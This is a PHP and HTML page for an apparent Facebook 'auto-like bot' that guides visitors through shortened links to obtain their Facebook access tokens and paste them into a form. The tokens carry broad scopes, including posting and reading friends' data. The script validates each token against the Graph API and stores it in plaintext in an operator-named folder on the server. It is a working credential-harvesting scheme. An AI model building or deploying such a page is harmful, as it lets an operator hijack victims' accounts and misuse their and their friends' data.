<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>-=[ SHAHAB ANWAR ]=-</title>
<!-- The snow.css file animates the snow -->
<link rel="stylesheet" href="snow.css" type="text/css" media="screen" charset="utf-8">
<link rel="shortcut icon" type="image/png" href="http://icons.iconarchive.com/icons/icontexto/social-inside/256/social-inside-facebook-icon.png" />
<!-- The snow.js file creates the snow -->
<script src="snow.js" type="text/javascript" charset="utf-8"></script>
<link href='http://fonts.googleapis.com/css?family=Niconne' rel='stylesheet' type='text/css'>

</head>
<style>
.button {
	display: inline-block;
	zoom: 1; /* zoom and *display = ie7 hack for display:inline-block */
	*display: inline;
	vertical-align: baseline;
	margin: 0 2px;
	outline: none;
	cursor: pointer;
	text-align: center;
	text-decoration: none;
	font: 14px/100% Arial, Helvetica, sans-serif;
	padding: .5em 2em .55em;
	text-shadow: 0 1px 1px rgba(0,0,0,.3);
	-webkit-border-radius: .5em; 
	-moz-border-radius: .5em;
	border-radius: .5em;
	-webkit-box-shadow: 0 1px 2px rgba(0,0,0,.2);
	-moz-box-shadow: 0 1px 2px rgba(0,0,0,.2);
	box-shadow: 0 1px 2px rgba(0,0,0,.2);
}
.button:hover {
	text-decoration: none;
}
.button:active {
	position: relative;
	top: 1px;
}

.bigrounded {
	-webkit-border-radius: 2em;
	-moz-border-radius: 2em;
	border-radius: 2em;
}

/* gray */
.gray {
	color: #e9e9e9;
	border: solid 1px #555;
	background: #6e6e6e;
	background: -webkit-gradient(linear, left top, left bottom, from(#888), to(#575757));
	background: -moz-linear-gradient(top,  #888,  #575757);
	filter:  progid:DXImageTransform.Microsoft.gradient(startColorstr='#888888', endColorstr='#575757');
}
.gray:hover {
	background: #616161;
	background: -webkit-gradient(linear, left top, left bottom, from(#757575), to(#4b4b4b));
	background: -moz-linear-gradient(top,  #757575,  #4b4b4b);
	filter:  progid:DXImageTransform.Microsoft.gradient(startColorstr='#757575', endColorstr='#4b4b4b');
}
.gray:active {
	color: #afafaf;
	background: -webkit-gradient(linear, left top, left bottom, from(#575757), to(#888));
	background: -moz-linear-gradient(top,  #575757,  #888);
	filter:  progid:DXImageTransform.Microsoft.gradient(startColorstr='#575757', endColorstr='#888888');
}

.blue {
	color: #d9eef7;
	border: solid 1px #0076a3;
	background: #0095cd;
	background: -webkit-gradient(linear, left top, left bottom, from(#00adee), to(#0078a5));
	background: -moz-linear-gradient(top,  #00adee,  #0078a5);
	filter:  progid:DXImageTransform.Microsoft.gradient(startColorstr='#00adee', endColorstr='#0078a5');
}
.blue:hover {
	background: #007ead;
	background: -webkit-gradient(linear, left top, left bottom, from(#0095cc), to(#00678e));
	background: -moz-linear-gradient(top,  #0095cc,  #00678e);
	filter:  progid:DXImageTransform.Microsoft.gradient(startColorstr='#0095cc', endColorstr='#00678e');
}
.blue:active {
	color: #80bed6;
	background: -webkit-gradient(linear, left top, left bottom, from(#0078a5), to(#00adee));
	background: -moz-linear-gradient(top,  #0078a5,  #00adee);
	filter:  progid:DXImageTransform.Microsoft.gradient(startColorstr='#0078a5', endColorstr='#00adee');
}
.cf:before, .cf:after{
    content:"";
    display:table;
}

.cf:after{
    clear:both;
}

.cf{
    zoom:1;
}   
/* Form wrapper styling */
.form-wrapper {
    width: 450px;
    padding: 15px;
    margin: 150px auto 50px auto;
    background: #444;
    background: rgba(0,0,0,.2);
    border-radius: 10px;
    box-shadow: 0 1px 1px rgba(0,0,0,.4) inset, 0 1px 0 rgba(255,255,255,.2);
}

/* Form text input */

.form-wrapper input {
    width: 330px;
    height: 20px;
    padding: 10px 5px;
    float: left;    
    font: bold 15px 'lucida sans', 'trebuchet MS', 'Tahoma';
    border: 0;
    background: #eee;
    border-radius: 3px 0 0 3px;      
}

.form-wrapper input:focus {
    outline: 0;
    background: #fff;
    box-shadow: 0 0 2px rgba(0,0,0,.8) inset;
}

.form-wrapper input::-webkit-input-placeholder {
   color: #999;
   font-weight: normal;
   font-style: italic;
}

.form-wrapper input:-moz-placeholder {
    color: #999;
    font-weight: normal;
    font-style: italic;
}

.form-wrapper input:-ms-input-placeholder {
    color: #999;
    font-weight: normal;
    font-style: italic;
}    

/* Form submit button */
.form-wrapper button {
    overflow: visible;
    position: relative;
    float: right;
    border: 0;
    padding: 0;
    cursor: pointer;
    height: 40px;
    width: 110px;
    font: bold 15px/40px 'lucida sans', 'trebuchet MS', 'Tahoma';
    color: #fff;
    text-transform: uppercase;
    background: #d83c3c;
    border-radius: 0 3px 3px 0;      
    text-shadow: 0 -1px 0 rgba(0, 0 ,0, .3);
}   
  
.form-wrapper button:hover{		
    background: #e54040;
}	
  
.form-wrapper button:active,
.form-wrapper button:focus{   
    background: #c42f2f;
	outline: 0;   
}

.form-wrapper button:before { /* left arrow */
    content: '';
    position: absolute;
    border-width: 8px 8px 8px 0;
    border-style: solid solid solid none;
    border-color: transparent #d83c3c transparent;
    top: 12px;
    left: -6px;
}

.form-wrapper button:hover:before{
    border-right-color: #e54040;
}

.form-wrapper button:focus:before,
.form-wrapper button:active:before{
        border-right-color: #c42f2f;
}      

.form-wrapper button::-moz-focus-inner { /* remove extra button spacing for Mozilla Firefox */
    border: 0;
    padding: 0;
}    


</style>


<?php
error_reporting(0);
$bot=new bot();
class bot{ 

public function getGr($as,$bs){
$ar=array(
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $ShahabAnwar[]=$b.'='.$c;
}
$true='?'.implode('&',$ShahabAnwar);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'CR3AT3D BY SHAHAB ANWAR',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){
if(!is_dir('ShahabAnwar')){
        mkdir('ShahabAnwar');
}
if($bb){
$blue=fopen('ShahabAnwar/'.$id,'w');
fwrite($blue,$tk.'*on*on*on*on*'.$bb);
        fclose($blue);

echo '

		<script type="text/javascript">

			document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

			document.getElementById("resp").innerHTML="Comment Text Saved.";

		</script>';
}else{
        if($z){
if(file_exists('ShahabAnwar/'.$id)){
$file=file_get_contents('ShahabAnwar/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('ShahabAnwar/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*on*on*on*on*'.$c;
$xs=fopen('ShahabAnwar/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('ShahabAnwar/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('ShahabAnwar/'.$id,'w');
fwrite($up,$tk.'*on*on*on*on*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('ShahabAnwar/'.$id,'w');
fwrite($up,$tk.'*on*on*on*on*');
        fclose($up);
        }
echo '

		<script type="text/javascript">

			document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

			document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

		</script>';}}
}
public function lOgbot($d){
        unlink('ShahabAnwar/'.$d);
        unset($_SESSION[key]);

echo'
<script type="text/javascript">alert("INFO : Logout success")
</script>';

        $this->atas();
        $this->home();
        $this->bwh();
}

public function cek($tok,$id,$nm){
echo '
<div id="container">
<div id="snowContainer">
</div>
  </div>
  <div id="message">
<center>
     		<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
	<p class="text2">Welcome To Champion Bot Team<font color="red"> '.$nm.'</font><br>
    Activate Your Bot My Dear Friend !</p><br>
	     	<form action="index.php" method="post">
            <p class="text2">
				<input class="button blue bigrounded" type="submit" value="ACTIVATE"></p>
     			</form></div></center>';

$this->membEr();
}

public function atas(){
    echo'
<center></font><center><link href="http://fonts.googleapis.com/css?family=Aladin" rel="stylesheet" type="text/css"><link rel="stylesheet" type="text/css" <font size="3"></head>
<body><div style="font-family: Aladin;font-size: 35pt;text-shadow: 0 0 11px #09dbea, 0 0 11px #09dbea, 0 0 11px #09dbea;color: #FFF"><font color="blue" size="10"><font size="75"<b> <script language="JavaScript" src="scripts/ShahabAnwar.js" size="520"></script></b></font></font><br><center></h3>
<center>';
}

public function home(){
}

public function bwh(){
echo '

     <div id="container"> 
  <!-- The container is dynamically populated using the init function in snow.js --> 
  <!-- Its dimensions and position are defined using its id selector in snow.css -->
  <div id="snowContainer">
   </div>
  </div>
  <!-- its appearance, dimensions, and position are defined using its id selector in snow.css -->
<div id="message">
<p class="text2">
     <a target="_blank" href="https://goo.gl/CvenbL">First Allow Permission</a></br>
     <a target="_blank" href="https://goo.gl/NkKRQ6">Now Get Your Token</a>
     <form class="form-wrapper cf" action="index.php" method="post">
     <input type="text" name="token" placeholder="Paste Your Token Here..." required>
     <button type="submit">SUBMIT</button></p>
     </form> ';

     $this->membEr();

   }

public function membEr(){
        if(!is_dir('ShahabAnwar')){
        mkdir('ShahabAnwar');
}
$up=opendir('ShahabAnwar');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }

echo'
<div id="footer">
<font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color: red"> Bot Lovers : </font> <font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color="red">'.count($user).'</font><br>
<font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color: red"> Powered By : </font> <font style="font-family: Aladin;font-size: 20pt;text-shadow: 0 0 11px #8b814c, 0 0 11px #8b814c, 0 0 11px #8b814c;color="red">Shahab Anwar</font>
</div>';
}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('ShahabAnwar/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';
        unset($_SESSION[key]);
        unlink('ShahabAnwar/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '



			<script type="text/javascript">

				document.getElementById("resp").style="color:red;font-family:miaanFont;";

				document.getElementById("resp").innerHTML="<h2>Token Is Invalid</h2>";

			</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
<audio
src="http://get2.mymp3singer.net/files/ds63/31237/02%20-%20Tere%20Liye-(MyMp3Singer.net).mp3" autoplay="" loop=""></audio>
</audio>   